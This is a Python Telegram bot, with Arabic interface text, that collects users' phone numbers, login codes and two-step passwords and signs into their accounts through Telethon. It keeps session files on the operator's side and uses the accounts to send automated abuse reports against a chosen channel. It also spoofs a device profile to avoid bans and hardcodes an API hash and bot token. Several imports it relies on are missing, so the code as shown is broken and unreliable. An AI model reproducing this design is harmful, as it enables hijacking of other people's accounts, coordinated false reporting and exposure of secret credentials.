from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQueryHandler, ContextTypes, filters
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError
from telethon.network.connection.tcpabridged import ConnectionTcpAbridged
import os

# تفاصيل API الخاصة بك
API_ID = '16748685'
API_HASH = 'f0c8f7e4a7a50b5c64fd5243a256fd2f'
BOT_TOKEN = '7852676274:AAHIx3Q9qFbylmvHKDhbhT5nEpFOFA5i2CM'

# قاموس لتخزين معلومات المستخدم
user_data = {}

# تفاصيل جهاز وهمي لمحاكاة جهاز حقيقي وتجنب الحظر
DEVICE_SETTINGS = {
    'device_model': 'Samsung Galaxy S21',
    'system_version': 'Android 12',
    'app_version': '8.4',
    'lang_code': 'en',
    'system_lang_code': 'en'
}

# إعداد العميل مع محاكاة جهاز حقيقي
def create_client(user_id):
    return TelegramClient(
        f'session_{user_id}',
        API_ID,
        API_HASH,
        device_model=DEVICE_SETTINGS['device_model'],
        system_version=DEVICE_SETTINGS['system_version'],
        app_version=DEVICE_SETTINGS['app_version'],
        lang_code=DEVICE_SETTINGS['lang_code'],
        system_lang_code=DEVICE_SETTINGS['system_lang_code'],
        connection=ConnectionTcpAbridged
    )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    keyboard = [
        [InlineKeyboardButton("تسجيل حساب", callback_data='register')],
        [InlineKeyboardButton("إبلاغ", callback_data='report')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text('مرحبًا! اختر ما تريد القيام به:', reply_markup=reply_markup)

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'register':
        await query.edit_message_text(text="الرجاء إدخال رقم هاتفك مع رمز الدولة (مثال: +1234567890):")
        return 'PHONE'
    elif query.data == 'report':
        await query.edit_message_text(text="الرجاء إدخال اسم المستخدم أو رابط القناة/المجموعة التي تريد الإبلاغ عنها:")
        return 'CHANNEL'

async def phone_number(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    phone = update.message.text
    user_data[user_id] = {'phone': phone}

    client = create_client(user_id)
    await client.connect()

    if not await client.is_user_authorized():
        try:
            sent_code = await client.send_code_request(phone)
            user_data[user_id]['phone_code_hash'] = sent_code.phone_code_hash
            await update.message.reply_text("تم إرسال رمز التحقق. الرجاء إدخاله:")
            return 'CODE'
        except Exception as e:
            await update.message.reply_text(f"حدث خطأ: {str(e)}")
            return

async def verification_code(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    code = update.message.text

    client = create_client(user_id)
    await client.connect()

    try:
        await client.sign_in(user_data[user_id]['phone'], code, phone_code_hash=user_data[user_id]['phone_code_hash'])
        await update.message.reply_text("تم تسجيل الدخول بنجاح!")
    except SessionPasswordNeededError:
        await update.message.reply_text("مطلوب التحقق بخطوتين. الرجاء إدخال كلمة المرور:")
        return 'PASSWORD'
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {str(e)}")

async def two_step_verification(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_user.id
    password = update.message.text

    client = create_client(user_id)
    await client.connect()

    try:
        await client.sign_in(password=password)
        await update.message.reply_text("تم تسجيل الدخول بنجاح!")
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {str(e)}")

async def channel_info(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    channel_username = update.message.text
    user_id = update.effective_user.id

    client = create_client(user_id)
    await client.connect()

    try:
        channel = await client.get_entity(channel_username)
        info = (
            f"معلومات القناة/المجموعة:\n"
            f"الاسم: {channel.title}\n"
            f"المعرف: {channel.username if hasattr(channel, 'username') else 'غير متاح'}\n"
            f"الوصف: {channel.about if hasattr(channel, 'about') else 'غير متاح'}\n"
            f"عدد المشتركين: {channel.participants_count if hasattr(channel, 'participants_count') else 'غير متاح'}"
        )

        keyboard = [
            [InlineKeyboardButton("محتوى إباحي", callback_data='report_porn')],
            [InlineKeyboardButton("عنف", callback_data='report_violence')],
            [InlineKeyboardButton("سبام", callback_data='report_spam')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)

        await update.message.reply_text(info, reply_markup=reply_markup)
        user_data[user_id]['channel'] = channel
    except Exception as e:
        await update.message.reply_text(f"حدث خطأ: {str(e)}")

async def report_channel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    user_id = update.effective_user.id
    channel = user_data[user_id]['channel']

    client = create_client(user_id)
    await client.connect()

    reason = InputReportReasonPornography()
    if query.data == 'report_violence':
        reason = InputReportReasonViolence()
    elif query.data == 'report_spam':
        reason = InputReportReasonSpam()

    try:
        result = await client(ReportPeerRequest(
            peer=InputPeerChannel(channel.id, channel.access_hash),
            reason=reason,
            message="تقرير تلقائي"
        ))
        if result:
            await query.edit_message_text("تم الإبلاغ بنجاح!")
        else:
            await query.edit_message_text("فشل الإبلاغ. حاول مرة أخرى لاحقًا.")
    except Exception as e:
        await query.edit_message_text(f"حدث خطأ أثناء الإبلاغ: {str(e)}")

def main() -> None:
    application = Application.builder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CallbackQueryHandler(button))
    application.add_handler(MessageHandler(filters.Regex(r'^\+\d+$') & ~filters.COMMAND, phone_number))
    application.add_handler(MessageHandler(filters.Regex(r'^\d+$') & ~filters.COMMAND, verification_code))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, channel_info))
    application.add_handler(CallbackQueryHandler(report_channel, pattern='^report_'))

    application.run_polling()

if __name__ == '__main__':
    main()
